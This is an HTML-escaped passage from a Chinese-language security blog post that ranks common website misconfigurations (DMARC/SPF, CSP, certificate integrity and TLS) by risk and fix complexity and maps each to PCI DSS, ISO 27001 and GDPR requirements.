&lt;h2 id=&quot;%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A&quot;&gt;#&lt;/a&gt; №３ 郵件系統 DMARC 設定&lt;/h2&gt;
&lt;p&gt;排名第三的郵件系統 DMARC 設定，在這個項目裡有大於 70％ 的網站DMARC 設置不全或無設置，&lt;strong&gt;DMARC 會向收件伺服器指示該如何處理特定郵件&lt;/strong&gt;，讓伺服器在收到疑似來自自身機構卻未通過驗證檢查的郵件，或是不符合 DMARC 政策記錄中驗證規定的郵件時，採取合適的處置方式。&lt;/p&gt;
&lt;h3 id=&quot;%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA&quot;&gt;#&lt;/a&gt; 改善複雜度等級為：低複雜度高風險&lt;/h3&gt;
&lt;p&gt;無SPF 紀錄：建議為網域設定 SPF 紀錄&lt;/p&gt;
&lt;h3 id=&quot;%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA&quot;&gt;#&lt;/a&gt; 改善複雜度等級為：中複雜度高風險&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;無 DMARC 紀錄&lt;/strong&gt;：建議為網域設定 DMARC 紀錄（先設置 SPF 與 DKIM）&lt;/p&gt;
&lt;p&gt;由於 DMARC 必須仰賴 SPF 與 DKIM 機制才能發揮功效，因此建議先檢查是否有 SPF 設置錯誤的問題，而雖然 SPF 的改善複雜度並不高，但許多網站的設置皆為預設，因此建議按照上一篇文章的初步檢視之後，可以將 SPF 的改善列為優先項目。&lt;/p&gt;
&lt;p&gt;此外，雖然 DMARC 的改善複雜度不低，但此項目對於防範社交工程來說效果十分顯著，所以若針對社交工程有疑慮的朋友，不妨在 SPF 設置完成之後，參考風險修復參考資料對 DMARC 進行設置。&lt;/p&gt;
&lt;h3 id=&quot;%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-2&quot;&gt;#&lt;/a&gt; 風險修復參考資料：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;SPF：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/&quot;&gt;&lt;strong&gt;關於 email security 的大小事 — 設定篇 SPF&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DMARC &amp;amp; DKIM：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/&quot;&gt;&lt;strong&gt;關於 email security 的大小事 — 設定篇 DKIM、DMARC&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3&quot;&gt;#&lt;/a&gt; №２CSP 未設置或安全等級不足&lt;/h2&gt;
&lt;p&gt;排名第二的CSP 未設置或安全等級不足，在這個項目裡有將近 90% 的網站CSP 未設置或安全等級不足，&lt;strong&gt;網頁內容安全政策&lt;/strong&gt;（ Content Security Policy, CSP）主要是為了防範 &lt;strong&gt;XSS（跨站腳本攻擊）&lt;/strong&gt;，以告知瀏覽器發出的 Request 位置是否受到信任來阻擋非預期的對外連線，加強網站安全性，在 http header 定義限制載入的跨站 script 像是 img-src、script-src…等這些可以載入外部資源的標籤。&lt;/p&gt;
&lt;h3 id=&quot;%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA&quot;&gt;#&lt;/a&gt; &lt;strong&gt;低複雜度中風險&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;CSP未設定或安全等級不足&lt;/strong&gt;：建議為避免此風險可於 HTTP Headers 中設置 Content-Security-Policy。&lt;/p&gt;
&lt;p&gt;此項目的改善複雜度不高，建議可以在 Cookie 的三項基本設定以及 X-Frame-Options 完成後對此項目進行設置。&lt;/p&gt;
&lt;h3 id=&quot;%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-3&quot;&gt;#&lt;/a&gt; 常見風險對應法規技術面項目：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;PCIDSS&lt;/strong&gt; ：Develop and maintain secure systems and applications&lt;/p&gt;
&lt;h3 id=&quot;%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-3&quot;&gt;#&lt;/a&gt; 細項說明：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;6.5.1: Protected from injection flaws, particularly SQL injection. Also consider OS Command Injection, LDAP and XPath injection flaws as well as other injection flaws.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;6.5.7: Protect all web applications and application interfaces from cross-site scripting (XSS).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E7%9A%84%E6%94%BB%E6%93%8A%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E7%9A%84%E6%94%BB%E6%93%8A%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82&quot;&gt;#&lt;/a&gt; &lt;strong&gt;懶人包：除了防範可能導致內嵌或是注入的攻擊，針對 XSS 的攻擊需要特別注意。&lt;/strong&gt;&lt;/h3&gt;
&lt;h3 id=&quot;%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-3&quot;&gt;#&lt;/a&gt; &lt;strong&gt;風險修復參考資料：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;&lt;strong&gt;Content Security Policy (CSP) - HTTP | MDN&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3&quot;&gt;#&lt;/a&gt; №１網站憑證完整性不足&lt;/h2&gt;
&lt;p&gt;排名第一的網站憑證完整性不足，在這個項目裡有 90% 的完整性不足例如&lt;strong&gt;憑證撤銷機制未設定完整&lt;/strong&gt;或&lt;strong&gt;憑證授權機關資源紀錄檢查&lt;/strong&gt;，在沒有這些設定的情況下業者很難防堵任意數位憑證認證機構擅自簽署網域憑證，而憑證完整性不足的業者中還包含了&lt;strong&gt;使用不安全的加密&lt;/strong&gt;及&lt;strong&gt;過期憑證&lt;/strong&gt;與&lt;strong&gt;過舊的 SSL/TLS 協議&lt;/strong&gt;，以上問題增加了業者在憑證層面可能發生資安事件的風險機率。&lt;/p&gt;
&lt;h3 id=&quot;%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA-2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA-2&quot;&gt;#&lt;/a&gt; 改善複雜度等級為：低複雜度高風險&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;SSL/TLS 協議過舊&lt;/strong&gt;：建議停用如 TLS 1.1 等過舊協議。&lt;/p&gt;
&lt;h3 id=&quot;%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-3&quot;&gt;#&lt;/a&gt; 改善複雜度等級為：低複雜度中風險&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;使用不安全的加密法&lt;/strong&gt;：建議在伺服器設定中停用此加密套件&lt;/p&gt;
&lt;h3 id=&quot;%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA&quot;&gt;#&lt;/a&gt; 改善複雜度等級為：中複雜度中風險&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;憑證撤銷機制未設定完整&lt;/strong&gt;：建議依據伺服器設定，使用加密套件完整此功能&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;憑證授權機關資源記錄檢查&lt;/strong&gt;：建議為網域設定 CAA RR&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;憑證過期&lt;/strong&gt;：建議聯繫 CA 更新憑證&lt;/p&gt;
&lt;p&gt;普遍網站在憑證相關的設置上較容易有疏漏，建議優先檢視協議過舊以及是否使用不安全的加密法，也因為這兩項的初步檢視較為容易，所以建議在憑證的類別中，將這兩項進行優先修復，而改善複雜度為中的三項憑證設置，由於檢視方式以及改善複雜度較高，因此可以評估這三項憑證項目的必要性，優先修復其餘中複雜度中風險項目，但因為憑證與資料的加密和保護息息相關，所以與之相關聯的法規項目也特別多，所以如果很在意法遵的朋友建議還是將憑證項目的風險修復順序提高一個層級。&lt;/p&gt;
&lt;h3 id=&quot;%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-4&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-4&quot;&gt;#&lt;/a&gt; 常見風險對應法規技術面項目：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;憑證撤銷機制未設定完整、不安全加密套件、憑證過期&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PCIDSS&lt;/strong&gt; ：&lt;/p&gt;
&lt;p&gt;Encrypt transmission of cardholder data across open，public networks&lt;/p&gt;
&lt;h3 id=&quot;%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-4&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-4&quot;&gt;#&lt;/a&gt; 細項說明：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;1: Use strong cryptography and security protocols to safeguard sensitive cardholder data during transmission over open, public networks.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;1.1: Ensure wireless networks transmitting cardholder data, or connected to the cardholder data environment, use industry best practices to implement strong encryption for authentication and transmission.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Develop and maintain secure systems and applications&lt;/p&gt;
&lt;h3 id=&quot;%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-5&quot;&gt;#&lt;/a&gt; 細項說明：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;6.5.4: Do not allow insecure communications.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-pcidss%EF%BC%9A%E9%99%A4%E4%BA%86%E4%B8%8D%E5%85%81%E8%A8%B1%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%80%9A%E8%A8%8A%E4%BB%A5%E5%A4%96%EF%BC%8C%E4%B9%9F%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BC%B7%E5%8A%A0%E5%AF%86%E5%92%8C%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0%E4%BE%86%E4%BF%9D%E8%AD%B7%E6%95%8F%E6%84%9F%E6%95%B8%E6%93%9A%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-pcidss%EF%BC%9A%E9%99%A4%E4%BA%86%E4%B8%8D%E5%85%81%E8%A8%B1%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%80%9A%E8%A8%8A%E4%BB%A5%E5%A4%96%EF%BC%8C%E4%B9%9F%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BC%B7%E5%8A%A0%E5%AF%86%E5%92%8C%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0%E4%BE%86%E4%BF%9D%E8%AD%B7%E6%95%8F%E6%84%9F%E6%95%B8%E6%93%9A%E3%80%82&quot;&gt;#&lt;/a&gt; &lt;strong&gt;懶人包之 PCIDSS&lt;/strong&gt;：除了不允許不安全的通訊以外，也需要使用強加密和安全協議來保護敏感數據。&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;ISO27001：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Cryptographic Controls&lt;/p&gt;
&lt;h3 id=&quot;%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-6&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-6&quot;&gt;#&lt;/a&gt; 細項說明：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Encryption and cryptographic controls are often seen as one of the key weapons in the security arsenal, however, on its own it is not the “silver bullet” that solves every problem. Incorrect selection of cryptographic technologies and techniques or the poor management of cryptographic material (e.g. keys and certificates) can create vulnerabilities themselves.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-iso27001%EF%BC%9A%E5%8A%A0%E5%AF%86%E6%8A%80%E8%A1%93%E7%9A%84%E9%81%B8%E6%93%87%E9%8C%AF%E8%AA%A4%E6%88%96%E5%8A%A0%E5%AF%86%E7%B4%A0%E6%9D%90%EF%BC%88%E4%BE%8B%E5%A6%82%E5%AF%86%E9%91%B0%E5%92%8C%E8%AD%89%E6%9B%B8%EF%BC%89%E7%9A%84%E7%AE%A1%E7%90%86%E4%B8%8D%E5%96%84%E5%8F%AF%E8%83%BD%E6%9C%83%E5%B0%8E%E8%87%B4%E6%9C%8D%E5%8B%99%E7%94%A2%E7%94%9F%E6%BC%8F%E6%B4%9E%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-iso27001%EF%BC%9A%E5%8A%A0%E5%AF%86%E6%8A%80%E8%A1%93%E7%9A%84%E9%81%B8%E6%93%87%E9%8C%AF%E8%AA%A4%E6%88%96%E5%8A%A0%E5%AF%86%E7%B4%A0%E6%9D%90%EF%BC%88%E4%BE%8B%E5%A6%82%E5%AF%86%E9%91%B0%E5%92%8C%E8%AD%89%E6%9B%B8%EF%BC%89%E7%9A%84%E7%AE%A1%E7%90%86%E4%B8%8D%E5%96%84%E5%8F%AF%E8%83%BD%E6%9C%83%E5%B0%8E%E8%87%B4%E6%9C%8D%E5%8B%99%E7%94%A2%E7%94%9F%E6%BC%8F%E6%B4%9E%E3%80%82&quot;&gt;#&lt;/a&gt; &lt;strong&gt;懶人包之 ISO27001&lt;/strong&gt;：加密技術的選擇錯誤或加密素材（例如密鑰和證書）的管理不善可能會導致服務產生漏洞。&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;GDPR：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Responsibility of the controller&lt;/p&gt;
&lt;h3 id=&quot;%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-7&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-7&quot;&gt;#&lt;/a&gt; 細項說明：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Taking into account the nature, scope, context and purposes of processing as well as the risks of varying likelihood and severity for the rights and freedoms of natural persons, the controller shall implement appropriate technical and organisational measures to ensure and to be able to demonstrate that processing is performed in accordance with this Regulation. 2Those measures shall be reviewed and updated where necessary.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Where proportionate in relation to processing activities, the measures referred to in paragraph 1 shall include the implementation of appropriate data protection policies by the controller.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Adherence to approved codes of conduct as referred to in &lt;a href=&quot;https://gdpr-info.eu/art-40-gdpr/&quot;&gt;Article 40&lt;/a&gt; or approved certification mechanisms as referred to in &lt;a href=&quot;https://gdpr-info.eu/art-42-gdpr/&quot;&gt;Article 42&lt;/a&gt; may be used as an element by which to demonstrate compliance with the obligations of the controller.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Data protection by design and by default&lt;/p&gt;
&lt;h3 id=&quot;%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-8&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-8&quot;&gt;#&lt;/a&gt; 細項說明：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Taking into account the state of the art, the cost of implementation and the nature, scope, context and purposes of processing as well as the risks of varying likelihood and severity for rights and freedoms of natural persons posed by the processing, the controller shall, both at the time of the determination of the means for processing and at the time of the processing itself, implement appropriate technical and organisational measures, such as pseudonymisation, which are designed to implement data-protection principles, such as data minimisation, in an effective manner and to integrate the necessary safeguards into the processing in order to meet the requirements of this Regulation and protect the rights of data subjects.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The controller shall implement appropriate technical and organisational measures for ensuring that, by default, only personal data which are necessary for each specific purpose of the processing are processed. 2That obligation applies to the amount of personal data collected, the extent of their processing, the period of their storage and their accessibility. 3In particular, such measures shall ensure that by default personal data are not made accessible without the individual’s intervention to an indefinite number of natural persons.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;An approved certification mechanism pursuant to &lt;a href=&quot;https://gdpr-info.eu/art-42-gdpr/&quot;&gt;Article 42&lt;/a&gt; may be used as an element to demonstrate compliance with the requirements set out in paragraphs 1 and 2 of this Article.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Security of processing&lt;/p&gt;
&lt;h3 id=&quot;%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-9&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-9&quot;&gt;#&lt;/a&gt; 細項說明：&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Taking into account the state of the art, the costs of implementation and the nature, scope, context and purposes of processing as well as the risk of varying likelihood and severity for the rights and freedoms of natural persons, the controller and the processor shall implement appropriate technical and organisational measures to ensure a level of security appropriate to the risk, including inter alia as appropriate:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;1.the pseudonymisation and encryption of personal data;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;2.the ability to ensure the ongoing confidentiality, integrity, availability and resilience of processing systems and services;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;3.the ability to restore the availability and access to personal data in a timely manner in the event of a physical or technical incident;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;4.a process for regularly testing, assessing and evaluating the effectiveness of technical and organisational measures for ensuring the security of the processing.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;In assessing the appropriate level of security account shall be taken in particular of the risks that are presented by processing, in particular from accidental or unlawful destruction, loss, alteration, unauthorised disclosure of, or access to personal data transmitted, stored or otherwise processed.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Adherence to an approved code of conduct as referred to in &lt;a href=&quot;https://gdpr-info.eu/art-40-gdpr/&quot;&gt;Article 40&lt;/a&gt; or an approved certification mechanism as referred to in &lt;a href=&quot;https://gdpr-info.eu/art-42-gdpr/&quot;&gt;Article 42&lt;/a&gt; may be used as an element by which to demonstrate compliance with the requirements set out in paragraph 1 of this Article.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The controller and processor shall take steps to ensure that any natural person acting under the authority of the controller or the processor who has access to personal data does not process them except on instructions from the controller, unless he or she is required to do so by Union or Member State law.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-gdpr-%EF%BC%9A%E6%8E%A7%E5%88%B6%E8%80%85%E6%87%89%E5%AF%A6%E6%96%BD%E9%81%A9%E7%95%B6%E7%9A%84%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E6%94%BF%E7%AD%96%E5%92%8C%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E5%8E%9F%E5%89%87%EF%BC%8C%E4%BE%8B%E5%A6%82%E5%B0%87%E5%BF%85%E8%A6%81%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%8E%AA%E6%96%BD%E6%95%B4%E5%90%88%E5%88%B0%E8%B3%87%E6%96%99%E8%99%95%E7%90%86%E9%81%8E%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B9%9F%E9%9C%80%E7%A2%BA%E4%BF%9D%E8%99%95%E7%90%86%E6%95%B8%E6%93%9A%E7%9A%84%E7%B3%BB%E7%B5%B1%E5%92%8C%E6%9C%8D%E5%8B%99%E6%A9%9F%E5%AF%86%E6%80%A7%E3%80%81%E5%AE%8C%E6%95%B4%E6%80%A7%E3%80%81%E5%8F%AF%E7%94%A8%E6%80%A7%EF%BC%8C%E9%81%BF%E5%85%8D%E6%9C%AA%E7%B6%93%E6%8E%88%E6%AC%8A%E8%80%8C%E6%8F%AD%E9%9C%B2%E7%9A%84%E5%80%8B%E4%BA%BA%E6%95%B8%E6%93%9A%E3%80%82&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-gdpr-%EF%BC%9A%E6%8E%A7%E5%88%B6%E8%80%85%E6%87%89%E5%AF%A6%E6%96%BD%E9%81%A9%E7%95%B6%E7%9A%84%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E6%94%BF%E7%AD%96%E5%92%8C%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E5%8E%9F%E5%89%87%EF%BC%8C%E4%BE%8B%E5%A6%82%E5%B0%87%E5%BF%85%E8%A6%81%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%8E%AA%E6%96%BD%E6%95%B4%E5%90%88%E5%88%B0%E8%B3%87%E6%96%99%E8%99%95%E7%90%86%E9%81%8E%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B9%9F%E9%9C%80%E7%A2%BA%E4%BF%9D%E8%99%95%E7%90%86%E6%95%B8%E6%93%9A%E7%9A%84%E7%B3%BB%E7%B5%B1%E5%92%8C%E6%9C%8D%E5%8B%99%E6%A9%9F%E5%AF%86%E6%80%A7%E3%80%81%E5%AE%8C%E6%95%B4%E6%80%A7%E3%80%81%E5%8F%AF%E7%94%A8%E6%80%A7%EF%BC%8C%E9%81%BF%E5%85%8D%E6%9C%AA%E7%B6%93%E6%8E%88%E6%AC%8A%E8%80%8C%E6%8F%AD%E9%9C%B2%E7%9A%84%E5%80%8B%E4%BA%BA%E6%95%B8%E6%93%9A%E3%80%82&quot;&gt;#&lt;/a&gt; &lt;strong&gt;懶人包之 GDPR&lt;/strong&gt; ：控制者應實施適當的數據保護政策和數據保護原則，例如將必要的保護措施整合到資料處理過程中，也需確保處理數據的系統和服務機密性、完整性、可用性，避免未經授權而揭露的個人數據。&lt;/h3&gt;
